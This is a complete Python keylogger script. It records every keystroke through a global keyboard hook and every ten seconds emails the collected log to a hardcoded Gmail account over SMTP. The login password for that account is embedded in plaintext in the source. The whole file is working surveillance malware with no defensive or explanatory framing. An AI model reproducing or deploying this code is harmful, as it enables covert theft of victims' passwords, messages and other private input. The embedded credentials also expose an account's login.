import keyboard
import smtplib
from threading import Timer

INTERVAL = 10
ADDRESS = "spyrosdv850@gmail.com"
PASSWORD = "123Asd!@#"

class Keyboard:
    def __init__(self, interval):
        self.interval = interval

        self.log = ""

    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)

        server.starttls()

        server.login(email, password)

        server.sendmail(email, email, message)

        server.quit()

    def callback(self, event):
        name = event.name

        if len(name) > 1:
            if name == "space":
                name = " "
            
            elif name == "enter":
                name = "\n"

            elif name == "decimal":
                name = "."

        self.log += name
    
    def report(self):
        if self.log:
            self.sendmail(ADDRESS, PASSWORD, self.log)

        self.log = ""

        timer = Timer(interval=self.interval, function=self.report)
        timer.start()

    def start(self):
        keyboard.on_release(callback=self.callback)

        self.report()

        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keyboard(interval=INTERVAL)
    keylogger.start()
